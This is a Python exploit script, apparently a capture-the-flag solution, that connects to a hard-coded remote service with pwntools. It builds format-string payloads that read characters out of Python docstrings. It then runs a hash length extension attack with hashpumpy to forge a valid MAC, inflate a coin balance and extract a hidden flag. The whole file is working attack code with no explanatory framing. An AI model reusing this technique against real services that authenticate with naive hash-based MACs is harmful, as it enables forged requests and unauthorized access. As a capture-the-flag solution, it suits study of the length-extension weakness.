from pwn import *
import base64
import hashpumpy

if __name__=="__main__":
	original_data = "BALSN_Coin=1"
	data_to_add = "&BALSN_Coin=2147483648&hidden_flag="

	r = remote("140.112.31.96", 10154)

	### buy coins
	r.recvuntil('>').decode()
	r.send('2\n')
	r.recvuntil('?\n>').decode()
	r.send("1" + '\n')
	res = r.recvuntil('>').decode()
	token = res.split(': ')[1].split('\n')[0]

	### bonus
	ans = ['{0}'] * 5
	min_bytes = [200] * 5

	for attr in dir(''):
		index = 0
		tmp = '{.' + attr + '.__doc__}'
		for c in tmp.format(''):
			#print(c)
			if  c == '!' and len(attr+str(index)) < min_bytes[0]:
				ans[0] = '{0.' + attr + '.__doc__[' + str(index) + ']}'
				min_bytes[0] = len(attr+str(index))
			elif  c == ';' and len(attr+str(index)) < min_bytes[1]:
				ans[1] = '{0.' + attr + '.__doc__[' + str(index) + ']}'
				min_bytes[1] = len(attr+str(index))
			elif  c == 'P' and len(attr+str(index)) < min_bytes[2]:
				ans[2] = '{0.' + attr + '.__doc__[' + str(index) + ']}'
				min_bytes[2] = len(attr+str(index))
			elif  c == '%' and len(attr+str(index)) < min_bytes[3]:
				ans[3] = '{0.' + attr + '.__doc__[' + str(index) + ']}'
				min_bytes[3] = len(attr+str(index))
			elif  c == '*' and len(attr+str(index)) < min_bytes[4]:
				ans[4] = '{0.' + attr + '.__doc__[' + str(index) + ']}'
				min_bytes[4] = len(attr+str(index))
			index += 1
	ans[0] = "{0.__ne__.__doc__[18]}"
	ans[1] = "{0.__init__.__doc__[29]}"
	ans[2] = "{0.ljust.__doc__[91]}"
	ans[3] = "{0.__mod__.__doc__[19]}"
	ans[4] = "{0.format.__doc__[9]}"
	for a in ans:
		data_to_add += a


	### length extension attack
	for key_length in range(45, 56):
		res = hashpumpy.hashpump(token, original_data, data_to_add, key_length)
		mac = res[0]
		msg = res[1]
		
		### buy flag
		r.send('3\n')
		r.recvuntil('\n>').decode()

		new = b''
		for index in range(len(msg)):
			if msg[index] == ord('='):
				new = msg[index+1:]
				break

		r.send(str(base64.b64encode(new))[2:-1]+'\n')
		r.recvuntil('>')
		r.send(mac+'\n')
		
		res = r.recvline().decode()
		#print(res)
		if res.find("Valid Token") != -1:
			r.recvline()
			print(r.recvline().decode())
			print(r.recvline().decode())
			print(r.recvline().decode())
			break